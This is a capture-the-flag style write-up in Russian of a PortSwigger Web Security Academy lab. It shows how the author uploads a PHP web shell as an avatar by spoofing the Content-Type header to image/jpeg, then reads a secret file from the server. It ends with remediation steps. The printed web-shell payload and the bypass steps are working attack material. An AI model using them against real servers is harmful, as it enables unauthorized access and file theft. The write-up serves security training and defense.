# Web Shell Upload via Content-Type Restriction Bypass

**Платформа:** PortSwigger Web Security Academy  
**Категория:** Web / File Upload Vulnerabilities  
**Уровень:** Apprentice  
**Дата:** 22.10.2026  
**Статус:** ✅ Solved  
**Ссылка:** https://0ae2007c0343458d810e52ea00a1006c.web-security-academy.net/

---

## 1. Objective
Загрузить web-shell, получить доступ к /home/carlos/secret

## 2. Reconnaissance
- Даны данные wiener:peter, залогинился
- Обнаружил кнопку 'Upload' для аватарки
- С помощью Burp Interceptor перехватил запрос, при загрузке случайной картинки
- Понял, что сайт при валидации смотрит только на MIME-тип в заголовке Content-Type, но не проверяет расширение файла

## 3. Exploitation
1. Создал файл exploit.php и поместил в него PHP-код веб-шелла
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
2. Загрузил его на сайт и перехватил запрос через Burp Interceptor
3. В заголовке Content-Type изменил
   ```text
   application/x-php -> image/jpeg
   ```
4. Отправил запрос и получил положительный ответ
5. Обратился к моему загруженному файлу через эндпоинт
   ```text
   /files/avatars/exploit.php
   ``` 

**Payloads:**
```text
Web-shell: <?php echo file_get_contents('/home/carlos/secret'); ?>
Измененный заголовок: application/x-php -> image/jpeg
```

**Почему это сработало:**  
При валидации загрузки сервер проверил Content-Type в запросе, который отправляется со стороны пользователя, который легко изменить

## 4. Result
Web-shell загружен, доступ получен, флаг найден, лабораторная решена

## 5. Key Takeaway & Remediation

**Что я узнал:**  
Валидировать загрузку сервер должен на back-end'е, а не доверять заголовкам из запроса. Проверка Content-Type ненадежна, потому что этот заголовок формирует сам клиент (браузер или злоумышленник через Burp) и его тривиально подделать. Вместо него сервер должен проверять реальное содержимое файла и расширение по белому списку.

**Как защитить:**
1. Проверять magic bytes каждого загружаемого файла, то есть проверять сигнатуру 
2. Использовать белый список расширений (.jpg, .png) и отключить выполнение скриптов в директории загрузок, чтобы даже проскочивший файл не выполнился
